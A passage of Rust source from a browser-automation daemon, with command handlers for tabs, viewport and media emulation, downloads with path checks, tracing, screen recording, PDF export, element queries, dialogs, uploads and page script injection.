    // A dialog-blocked tab's renderer is paused and cannot answer an eval, so
    // skip the viewport sync; it would otherwise stall on the CDP timeout. The
    // sync resumes on the next command once the dialog is resolved.
    let dialog_blocked = result.get("dialogBlocked").and_then(|v| v.as_bool()) == Some(true);
    if let Some(ref server) = state.stream_server {
        if let Some(mgr) = state.browser.as_ref().filter(|_| !dialog_blocked) {
            if let Ok(dims) = mgr
                .evaluate(
                    "JSON.stringify([window.innerWidth,window.innerHeight])",
                    None,
                )
                .await
            {
                if let Some(s) = dims.get("result").and_then(|v| v.as_str()) {
                    if let Ok(arr) = serde_json::from_str::<Vec<u32>>(s) {
                        if arr.len() == 2 && arr[0] > 0 && arr[1] > 0 {
                            server.set_viewport(arr[0], arr[1]).await;
                        }
                    }
                }
            }
        }
    }

    Ok(result)
}

async fn handle_tab_close(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let tab_id = {
        let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
        match cmd.get("tabId").and_then(|v| v.as_str()) {
            Some(s) => {
                let tab_ref = super::browser::TabRef::parse(s)?;
                Some(mgr.resolve_tab_ref(&tab_ref)?)
            }
            None => None,
        }
    };
    let dialog_session = state
        .pending_dialog
        .as_ref()
        .and_then(|d| d.session_id.clone());
    let result = {
        let mgr = state.browser.as_mut().ok_or("Browser not launched")?;
        mgr.tab_close_by_id(tab_id, dialog_session.as_deref())
            .await?
    };
    // Clear only after the close commits; a rejected close (last tab, bad
    // index) must not wipe the caller's refs and frame scope.
    state.ref_map.begin_snapshot();
    state.active_iframe_sessions.clear();
    state.webmcp.clear_invocations();
    state.active_frame_id = None;
    state.refresh_active_iframe_sessions().await;
    Ok(result)
}

async fn handle_viewport(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let width = cmd.get("width").and_then(|v| v.as_i64()).unwrap_or(1280) as i32;
    let height = cmd.get("height").and_then(|v| v.as_i64()).unwrap_or(720) as i32;
    let scale = cmd
        .get("deviceScaleFactor")
        .and_then(|v| v.as_f64())
        .unwrap_or(1.0);
    let mobile = cmd.get("mobile").and_then(|v| v.as_bool()).unwrap_or(false);

    mgr.set_viewport(width, height, scale, mobile).await?;

    state.viewport = Some((width, height, scale, mobile));

    // Update stream server viewport so status messages and screencast use the new dimensions
    if let Some(ref server) = state.stream_server {
        server.set_viewport(width as u32, height as u32).await;
    }

    Ok(json!({ "width": width, "height": height, "deviceScaleFactor": scale, "mobile": mobile }))
}

async fn handle_user_agent(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let ua = cmd
        .get("userAgent")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'userAgent' parameter")?;
    mgr.set_user_agent(ua).await?;
    state.session_setup.user_agent = Some(ua.to_string());
    Ok(json!({ "userAgent": ua }))
}

async fn handle_set_media(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let media = cmd.get("media").and_then(|v| v.as_str());

    let mut feat_list: Vec<(String, String)> = Vec::new();

    if let Some(scheme) = cmd.get("colorScheme").and_then(|v| v.as_str()) {
        feat_list.push(("prefers-color-scheme".to_string(), scheme.to_string()));
    }
    if let Some(motion) = cmd.get("reducedMotion").and_then(|v| v.as_str()) {
        feat_list.push(("prefers-reduced-motion".to_string(), motion.to_string()));
    }

    if let Some(obj) = cmd.get("features").and_then(|v| v.as_object()) {
        for (k, v) in obj {
            feat_list.push((k.clone(), v.as_str().unwrap_or("").to_string()));
        }
    }

    let features = if feat_list.is_empty() {
        None
    } else {
        Some(feat_list.clone())
    };

    mgr.set_emulated_media(media, features).await?;
    state.session_setup.emulated_media = Some(EmulatedMedia {
        media: media.map(String::from),
        features: feat_list,
    });
    Ok(json!({ "set": true }))
}

/// Chrome may still be flushing a download to disk after signalling
/// completion; wait briefly for the file to appear.
async fn wait_for_downloaded_file(path: &std::path::Path) -> bool {
    for _ in 0..10 {
        if path.exists() {
            return true;
        }
        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    }
    path.exists()
}

/// `download`: clicks the selector and saves the resulting file at `path`.
/// Only a browser this daemon launched may name files on the local filesystem.
async fn handle_download(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    if state
        .browser
        .as_ref()
        .is_some_and(|mgr| mgr.is_cdp_connection())
    {
        return Err(
            "download is not supported over --cdp, --auto-connect, or a provider: the remote endpoint names the saved file, so only a browser agent-browser launched can save to a local path"
                .to_string(),
        );
    }
    let result = download_to_path(cmd, state).await;
    // `download` points the browser at the destination's directory; restore the
    // configured one so later downloads land where `wait --download` expects.
    if let Some(mgr) = state.browser.as_ref() {
        if !mgr.is_cdp_connection() {
            mgr.enable_download_events().await;
        }
    }
    result
}

async fn download_to_path(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;
    let path_str = cmd
        .get("path")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'path' parameter")?;

    // Resolve to absolute path and canonicalize to prevent path traversal
    let raw_dest = if std::path::Path::new(path_str).is_absolute() {
        PathBuf::from(path_str)
    } else {
        std::env::current_dir()
            .map_err(|e| format!("Failed to get current directory: {}", e))?
            .join(path_str)
    };

    // Extract directory and desired filename
    let download_dir = raw_dest
        .parent()
        .ok_or("Invalid download path: no parent directory")?
        .to_path_buf();

    // Create the directory if it doesn't exist
    std::fs::create_dir_all(&download_dir)
        .map_err(|e| format!("Failed to create download directory: {}", e))?;

    // Canonicalize after mkdir so the path actually exists for resolution
    let download_dir = download_dir
        .canonicalize()
        .map_err(|e| format!("Failed to resolve download directory: {}", e))?;
    let dest = download_dir.join(
        raw_dest
            .file_name()
            .ok_or("Invalid download path: no filename")?,
    );
    let download_dir_str = download_dir
        .to_str()
        .ok_or("Download directory path is not valid UTF-8")?;

    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    // Set download behavior to save to the parent directory
    mgr.set_download_behavior(download_dir_str).await?;

    // Subscribe to CDP events before clicking so we don't miss the download event
    let mut rx = mgr.client.subscribe();

    // Click the element to trigger the download
    let result = interaction::click(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        "left",
        1,
        &state.iframe_sessions,
    )
    .await?;
    record_click_animation(
        &result,
        &mut state.mouse_state,
        &state.recording_state.shared_cursor,
    );

    // Wait for download to complete
    const DOWNLOAD_TIMEOUT: tokio::time::Duration = tokio::time::Duration::from_secs(30);
    let deadline = tokio::time::Instant::now() + DOWNLOAD_TIMEOUT;
    let mut downloaded_guid: Option<String> = None;

    loop {
        let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
        if remaining.is_zero() {
            return Err("Timeout waiting for download to complete".to_string());
        }

        match tokio::time::timeout(remaining, rx.recv()).await {
            Ok(Ok(event)) => {
                // Browser-domain download events may arrive without a sessionId
                // or with a different sessionId than the page session, so we
                // accept them regardless. Page-domain events are matched by
                // session to avoid cross-tab confusion.
                let is_page_session = event.session_id.as_deref() == Some(&session_id);
                let is_download_event = |method: &str, browser_method: &str, page_method: &str| {
                    method == browser_method || (method == page_method && is_page_session)
                };

                // Capture the GUID from downloadWillBegin
                if is_download_event(
                    &event.method,
                    "Browser.downloadWillBegin",
                    "Page.downloadWillBegin",
                ) {
                    if let Some(guid) = event.params.get("guid").and_then(|v| v.as_str()) {
                        downloaded_guid = Some(guid.to_string());
                    }
                }
                // Check for download completion or cancellation
                if is_download_event(
                    &event.method,
                    "Browser.downloadProgress",
                    "Page.downloadProgress",
                ) {
                    match event.params.get("state").and_then(|v| v.as_str()) {
                        Some("completed") => break,
                        Some("canceled") => {
                            return Err("Download was canceled".to_string());
                        }
                        _ => {}
                    }
                }
            }
            Ok(Err(tokio::sync::broadcast::error::RecvError::Lagged(_))) => continue,
            Ok(Err(_)) => return Err("Event stream closed".to_string()),
            Err(_) => return Err("Timeout waiting for download to complete".to_string()),
        }
    }

    if let Some(ref guid) = downloaded_guid {
        state.downloads.mark_claimed(guid);
    }

    // With "allowAndName" behavior, Chrome saves the file using the GUID as filename.
    // Rename it to the user-requested filename.
    if let Some(guid) = downloaded_guid {
        let guid_path = guid_download_path(&download_dir, &guid)?;
        if wait_for_downloaded_file(&guid_path).await {
            if !may_move_download(&guid_path, true, Some(download_dir_str)) {
                return Err(format!(
                    "Refusing to move {}: it resolves outside {}",
                    guid_path.display(),
                    download_dir.display()
                ));
            }
            std::fs::rename(&guid_path, &dest)
                .map_err(|e| format!("Failed to rename downloaded file: {}", e))?;
        } else {
            // The file might have been saved under its original name instead
            // of the GUID (e.g. when Chrome falls back to "allow" behavior).
            if !dest.exists() {
                return Err(format!(
                    "Downloaded file not found at expected path (GUID: {})",
                    guid
                ));
            }
        }
    } else {
        // GUID capture failed -- the file may have been saved under its original name
        // by Chrome. Only return success if dest already exists (avoid touching
        // unrelated files in the directory).
        if !dest.exists() {
            return Err(
                "Download completed but could not determine the downloaded file name".to_string(),
            );
        }
    }

    let dest_str = dest.to_string_lossy().to_string();
    Ok(json!({ "path": dest_str }))
}

// ---------------------------------------------------------------------------
// Phase 4 handlers
// ---------------------------------------------------------------------------

async fn handle_trace_start(state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    native_tracing::trace_start(&mgr.client, &session_id, &mut state.tracing_state).await
}

async fn handle_trace_stop(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let path = cmd.get("path").and_then(|v| v.as_str());
    native_tracing::trace_stop(&mgr.client, &session_id, &mut state.tracing_state, path).await
}

async fn handle_profiler_start(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let categories = cmd.get("categories").and_then(|v| v.as_array()).map(|arr| {
        arr.iter()
            .filter_map(|v| v.as_str().map(String::from))
            .collect()
    });
    native_tracing::profiler_start(
        &mgr.client,
        &session_id,
        &mut state.tracing_state,
        categories,
    )
    .await
}

async fn handle_profiler_stop(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let path = cmd.get("path").and_then(|v| v.as_str());
    native_tracing::profiler_stop(&mgr.client, &session_id, &mut state.tracing_state, path).await
}

/// Read an optional `fps` field from a recording command, rejecting rates the
/// recorder cannot honor before any browser work happens.
fn recording_fps_from_command(cmd: &Value) -> Result<Option<u32>, String> {
    match cmd.get("fps") {
        None | Some(Value::Null) => Ok(None),
        Some(value) => {
            let raw = value
                .as_u64()
                .filter(|v| *v <= u32::MAX as u64)
                .ok_or_else(|| format!("Invalid fps: {} is not a positive integer", value))?;
            recording::validate_fps(raw as u32).map(Some)
        }
    }
}

fn recording_options_from_command(cmd: &Value) -> Result<recording::RecordingOptions, String> {
    let contact_sheet_threshold = match cmd.get("contactSheetThreshold") {
        Some(value) => value
            .as_f64()
            .ok_or_else(|| format!("Invalid contact sheet threshold: {} is not a number", value))?,
        None => recording::DEFAULT_CONTACT_SHEET_THRESHOLD,
    };
    recording::validate_contact_sheet_threshold(contact_sheet_threshold)?;
    Ok(recording::RecordingOptions {
        fps: recording_fps_from_command(cmd)?,
        cursor: cmd.get("cursor").and_then(Value::as_bool).unwrap_or(false),
        contact_sheet: cmd
            .get("contactSheet")
            .and_then(Value::as_bool)
            .unwrap_or(false)
            || cmd.get("contactSheetThreshold").is_some(),
        contact_sheet_threshold,
    })
}

/// Start recording the current active page. The recorder attaches to the
/// active session as-is: no new browser context, no new tab, and no
/// navigation unless a URL is given (in which case the active tab navigates
/// there first). Capture therefore starts on an already-hydrated page instead
/// of at `load` on a cold navigation. Use `tab new` first to record in a
/// separate tab.
async fn handle_recording_start(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    // Reject before creating a context or changing the active page.
    if state.recording_state.active {
        return Err("Recording already active".to_string());
    }

    let path = cmd
        .get("path")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'path' parameter")?;

    let recording_url = cmd
        .get("url")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty());

    // Validate the rate and output path before any browser work so a bad value
    // costs nothing.
    let options = recording_options_from_command(cmd)?;
    recording::validate_output_path(path)?;

    {
        let domain_filter = state.domain_filter.read().await;
        if let Some(url) = recording_url {
            check_url_allowed_by_filter(domain_filter.as_ref(), url)?;
        }
    }

    if state.recording_state.active {
        return Err("Recording already active".to_string());
    }
    if state.browser.is_none() {
        return Err("Browser not launched".to_string());
    }

    // Check the external dependency before an optional navigation mutates the
    // active page. State is still inactive, so a failure needs no rollback.
    recording::check_ffmpeg_available().await?;

    if let Some(url) = recording_url {
        navigate_active_page(state, url, WaitUntil::Load).await?;
    }
    let (client, session_id) = {
        let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
        (mgr.client.clone(), mgr.active_session_id()?.to_string())
    };

    let result = recording::recording_start(&mut state.recording_state, path, options)?;
    state.start_recording_task(client, session_id).await?;

    if let Some(ref server) = state.stream_server {
        server.set_recording(true, &state.engine).await;
    }

    Ok(result)
}

async fn handle_recording_stop(state: &mut DaemonState) -> Result<Value, String> {
    // Clear the recording state even when the capture task failed, so a
    // broken take does not block the next `record start`.
    let task_result = state.stop_recording_task().await;
    let result = recording::recording_stop(&mut state.recording_state);
    task_result?;

    if let Some(ref server) = state.stream_server {
        server.set_recording(false, &state.engine).await;
    }

    result
}

async fn handle_recording_restart(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let path = cmd
        .get("path")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'path' parameter")?;
    let recording_url = cmd
        .get("url")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .map(String::from);

    // Validate the path and rate before stopping the in-flight take.
    recording::validate_output_path(path)?;
    let options = recording_options_from_command(cmd)?;

    {
        let domain_filter = state.domain_filter.read().await;
        if let Some(ref url) = recording_url {
            check_url_allowed_by_filter(domain_filter.as_ref(), url)?;
        }
    }

    // Preserve the in-flight take when the replacement cannot start. A
    // restart without a browser keeps its existing state-only behavior.
    if state.browser.is_some() {
        recording::check_ffmpeg_available().await?;
    }

    let _ = state.stop_recording_task().await;
    let previous_path = if state.recording_state.active {
        recording::recording_stop(&mut state.recording_state)
            .ok()
            .and_then(|v| v.get("path").and_then(|p| p.as_str()).map(String::from))
    } else {
        None
    };

    let recording_target = if state.browser.is_some() {
        if let Some(ref url) = recording_url {
            navigate_active_page(state, url, WaitUntil::Load).await?;
        }
        let browser = state.browser.as_ref().ok_or("Browser not launched")?;
        Some((
            browser.client.clone(),
            browser.active_session_id()?.to_string(),
        ))
    } else {
        None
    };

    recording::recording_start(&mut state.recording_state, path, options)?;

    if let Some((client, session_id)) = recording_target {
        state.start_recording_task(client, session_id).await?;
    }

    Ok(json!({
        "restarted": true,
        "previousPath": previous_path,
        "path": path,
        "fps": state.recording_state.fps,
        "cursor": state.recording_state.cursor,
        "contactSheet": state.recording_state.contact_sheet,
        "contactSheetPath": state.recording_state.contact_sheet_path,
    }))
}

async fn handle_pdf(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    let params = json!({
        "printBackground": cmd.get("printBackground").and_then(|v| v.as_bool()).unwrap_or(true),
        "landscape": cmd.get("landscape").and_then(|v| v.as_bool()).unwrap_or(false),
        "preferCSSPageSize": cmd.get("preferCSSPageSize").and_then(|v| v.as_bool()).unwrap_or(false),
    });

    let result = mgr
        .client
        .send_command("Page.printToPDF", Some(params), Some(&session_id))
        .await?;

    let data = result
        .get("data")
        .and_then(|v| v.as_str())
        .ok_or("No PDF data returned")?;

    let path = cmd.get("path").and_then(|v| v.as_str());
    let save_path = match path {
        Some(p) => p.to_string(),
        None => {
            let dir = std::env::home_dir()
                .unwrap_or_else(std::env::temp_dir)
                .join(".agent-browser")
                .join("tmp")
                .join("pdfs");
            let _ = std::fs::create_dir_all(&dir);
            let timestamp = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_millis();
            dir.join(format!("page-{}.pdf", timestamp))
                .to_string_lossy()
                .to_string()
        }
    };

    let bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, data)
        .map_err(|e| format!("Failed to decode PDF: {}", e))?;
    std::fs::write(&save_path, &bytes).map_err(|e| format!("Failed to save PDF: {}", e))?;

    Ok(json!({ "path": save_path }))
}

// ---------------------------------------------------------------------------
// Phase 8 handlers
// ---------------------------------------------------------------------------

async fn handle_focus(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    interaction::focus(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "focused": selector }))
}

async fn handle_clear(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    interaction::clear(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "cleared": selector }))
}

async fn handle_selectall(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    interaction::select_all(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "selected": selector }))
}

async fn handle_scrollintoview(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    interaction::scroll_into_view(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "scrolled": selector }))
}

async fn handle_dispatch(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;
    let event_type = cmd
        .get("event")
        .or_else(|| cmd.get("eventType"))
        .and_then(|v| v.as_str())
        .ok_or("Missing 'event' parameter")?;
    let event_init = cmd.get("eventInit");

    interaction::dispatch_event(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        event_type,
        event_init,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "dispatched": event_type, "selector": selector }))
}

async fn handle_highlight(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    interaction::highlight(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "highlighted": selector }))
}

async fn handle_tap(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let selector = cmd.get("selector").and_then(|v| v.as_str());

    // Route through Appium for iOS/WebDriver using coordinate-based tap
    if let Some(ref appium) = state.appium {
        if state.browser.is_none() {
            let x = cmd.get("x").and_then(|v| v.as_f64()).unwrap_or(200.0);
            let y = cmd.get("y").and_then(|v| v.as_f64()).unwrap_or(200.0);
            appium.tap(x, y).await?;
            return Ok(json!({ "tapped": true, "x": x, "y": y }));
        }
    }

    let sel = selector.ok_or("Missing 'selector' parameter")?;
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();

    interaction::tap_touch(
        &mgr.client,
        &session_id,
        &state.ref_map,
        sel,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "tapped": sel }))
}

async fn handle_boundingbox(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let bbox = super::element::get_element_bounding_box(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    Ok(bbox)
}

async fn handle_innertext(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let text = super::element::get_element_inner_text(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "text": text }))
}

async fn handle_innerhtml(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let html = super::element::get_element_inner_html(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "html": html }))
}

async fn handle_inputvalue(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let value = super::element::get_element_input_value(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "value": value }))
}

async fn handle_setvalue(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;
    let value = cmd
        .get("value")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'value' parameter")?;

    super::element::set_element_value(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        value,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "set": selector, "value": value }))
}

async fn handle_count(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let count = super::element::get_element_count(&mgr.client, &session_id, selector).await?;
    Ok(json!({ "count": count, "selector": selector }))
}

async fn handle_styles(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let properties = cmd.get("properties").and_then(|v| v.as_array()).map(|arr| {
        arr.iter()
            .filter_map(|v| v.as_str().map(String::from))
            .collect()
    });

    let styles = super::element::get_element_styles(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        properties,
        &state.iframe_sessions,
    )
    .await?;
    Ok(json!({ "styles": styles }))
}

async fn handle_bringtofront(state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    mgr.bring_to_front().await?;
    Ok(json!({ "broughtToFront": true }))
}

async fn handle_timezone(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let timezone = cmd
        .get("timezoneId")
        .or_else(|| cmd.get("timezone"))
        .and_then(|v| v.as_str())
        .ok_or("Missing 'timezoneId' parameter")?;
    mgr.set_timezone(timezone).await?;
    state.session_setup.timezone = Some(timezone.to_string());
    Ok(json!({ "timezoneId": timezone }))
}

async fn handle_locale(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let locale = cmd
        .get("locale")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'locale' parameter")?;
    mgr.set_locale(locale).await?;
    state.session_setup.locale = Some(locale.to_string());
    Ok(json!({ "locale": locale }))
}

async fn handle_geolocation(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let latitude = cmd
        .get("latitude")
        .and_then(|v| v.as_f64())
        .ok_or("Missing 'latitude' parameter")?;
    let longitude = cmd
        .get("longitude")
        .and_then(|v| v.as_f64())
        .ok_or("Missing 'longitude' parameter")?;
    let accuracy = cmd.get("accuracy").and_then(|v| v.as_f64());

    mgr.set_geolocation(latitude, longitude, accuracy).await?;
    state.session_setup.geolocation = Some((latitude, longitude, accuracy));
    Ok(json!({ "latitude": latitude, "longitude": longitude }))
}

async fn handle_permissions(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let permissions: Vec<String> = cmd
        .get("permissions")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str().map(String::from))
                .collect()
        })
        .unwrap_or_default();

    mgr.grant_permissions(&permissions).await?;
    Ok(json!({ "granted": permissions }))
}

async fn handle_dialog(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let response = cmd.get("response").and_then(|v| v.as_str());

    // dialog status — return pending dialog info
    if response == Some("status") {
        return Ok(match &state.pending_dialog {
            Some(dialog) => {
                let mut obj = json!({
                    "hasDialog": true,
                    "type": dialog.dialog_type,
                    "message": dialog.message,
                });
                if let Some(ref prompt) = dialog.default_prompt {
                    obj["defaultPrompt"] = json!(prompt);
                }
                obj
            }
            None => json!({ "hasDialog": false }),
        });
    }

    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let accept = response
        .map(|r| r == "accept")
        .or_else(|| cmd.get("accept").and_then(|v| v.as_bool()))
        .unwrap_or(true);
    let prompt_text = cmd.get("promptText").and_then(|v| v.as_str());

    // Clear tracked state even if Chrome reports no dialog (e.g. it was
    // already resolved and the closed event was missed); otherwise a stale
    // pending_dialog would make every page command fail fast forever.
    let result = mgr.handle_dialog(accept, prompt_text).await;
    state.pending_dialog = None;
    result?;

    // If a click's mousedown opened this dialog, the button is still logically
    // down. Release it now that the page is unblocked so the next click does
    // not register as a drag or double-click.
    if let Some(release) = state.pending_pointer_release.take() {
        if let Some(ref mgr) = state.browser {
            let _ = interaction::dispatch_pending_release(&mgr.client, &release).await;
        }
        state.mouse_state.buttons = 0;
        if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
            cursor.record(state.mouse_state.x, state.mouse_state.y, 0);
        }
    }
    Ok(json!({ "handled": true, "accepted": accept }))
}

async fn handle_upload(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let selector = cmd
        .get("selector")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'selector' parameter")?;

    let files: Vec<String> = cmd
        .get("files")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str().map(String::from))
                .collect()
        })
        .or_else(|| {
            cmd.get("file")
                .and_then(|v| v.as_str())
                .map(|s| vec![s.to_string()])
        })
        .unwrap_or_default();

    mgr.upload_files(selector, &files, &state.ref_map, &state.iframe_sessions)
        .await?;
    Ok(json!({ "uploaded": files.len(), "selector": selector }))
}

async fn handle_addscript(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let content = cmd
        .get("content")
        .or_else(|| cmd.get("source"))
        .or_else(|| cmd.get("script"))
        .and_then(|v| v.as_str());
    let url = cmd.get("url").and_then(|v| v.as_str());

    if content.is_none() && url.is_none() {
        return Err("At least one of 'content' or 'url' is required".to_string());
    }

    if let Some(src_url) = url {
        let js = format!(
            r#"new Promise((resolve, reject) => {{
                const s = document.createElement('script');
                s.src = {};
                s.onload = () => resolve(true);
                s.onerror = () => reject(new Error('Failed to load script'));
                document.head.appendChild(s);
            }})"#,
            serde_json::to_string(src_url).unwrap_or_default()
        );
        mgr.evaluate(&js, None).await?;
    } else if let Some(source) = content {
        let js = format!(
            r#"(() => {{
                const s = document.createElement('script');
                s.textContent = {};
                document.head.appendChild(s);
            }})()"#,
            serde_json::to_string(source).unwrap_or_default()
        );
        mgr.evaluate(&js, None).await?;
    }

    Ok(json!({ "added": true }))
}

async fn handle_addinitscript(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
